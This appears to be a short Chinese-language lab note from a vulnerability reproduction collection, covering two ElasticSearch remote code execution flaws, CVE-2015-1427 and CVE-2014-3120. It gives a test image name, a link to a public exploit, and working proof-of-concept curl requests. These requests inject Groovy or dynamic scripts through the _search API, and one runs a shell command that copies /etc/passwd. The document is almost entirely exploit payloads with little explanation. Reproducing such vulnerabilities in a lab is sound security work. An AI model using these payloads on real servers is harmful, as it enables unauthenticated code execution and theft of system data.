## CVE-2015-1427 - ElasticSearch Search Groovy Sandbox Bypass

测试镜像

* src/elasticsearch/1.1.1

参考链接

* [Exploit for CVE-2015-1427, ElasticSearch Unauthenticated Remote Code Execution](https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch)

Poc

```
# 创建一点数据
curl 127.0.0.1:9200/what/ever -d '{"some": "data"}'; echo

# 执行代码
curl 127.0.0.1:9200/_search --data '{
  "size": 1,
  "script_fields": {
    "lupin": {
      "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cp /etc/passwd /tmp\").getText()"
    }
  }
}'; echo
```

## CVE-2014-3120 - ElasticSearch Dynamic Script Arbitrary Java Execution

Poc

```
curl 127.0.0.1:9200/_search --data '{
  "size": 1,
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      }
    }
  },
  "script_fields": {
    "something": {
      "script": "new StringBuilder(\"HelloWorld\").reverse().toString()"
    }
  }
}'
```




